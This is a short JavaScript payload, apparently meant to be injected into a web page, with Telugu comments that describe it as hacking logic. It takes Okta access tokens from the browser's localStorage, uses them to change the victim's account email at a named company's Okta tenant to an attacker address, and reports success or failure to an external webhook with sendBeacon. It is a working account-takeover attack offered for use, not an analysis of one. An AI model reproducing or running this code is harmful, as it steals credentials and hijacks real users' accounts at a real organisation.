
(function() {
    const webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";

    // 1. అసలైన హ్యాకింగ్ లాజిక్ (నీవు పంపిన కోడ్)
    async function executeFullATO(bearerToken) {
        const apiBase = "https://genpact.okta-emea.com/api/v1/users/me";
        
        try {
            const emailChange = await fetch(apiBase, {
                method: 'PATCH',
                headers: {
                    'Authorization': 'Bearer ' + bearerToken,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    "profile": { "email": "hacked@shadow-researcher.com" }
                })
            });

            if (emailChange.status === 200 || emailChange.status === 204) {
                navigator.sendBeacon(webhook + "?status=ATO_SUCCESS_EMAIL_CHANGED");
            }
        } catch (e) {
            navigator.sendBeacon(webhook + "?status=ATO_ATTEMPT_SENT");
        }
    }

    // 2. టోకెన్ దొరకగానే పైన ఉన్న ఫంక్షన్ ని రన్ చేయడం
    async function init() {
        // Okta టోకెన్ కోసం వెతకడం
        const token = localStorage.getItem('okta-token-storage') || localStorage.getItem('accessToken');
        
        if (token) {
            // టోకెన్ దొరికితే వెంటనే హ్యాక్ రన్ అవుతుంది
            executeFullATO(token);
        } else {
            // టోకెన్ లేకపోయినా మనకు హిట్ రావాలి
            navigator.sendBeacon(webhook + "?status=WAITING_FOR_TOKEN");
        }
    }

    init();
})();
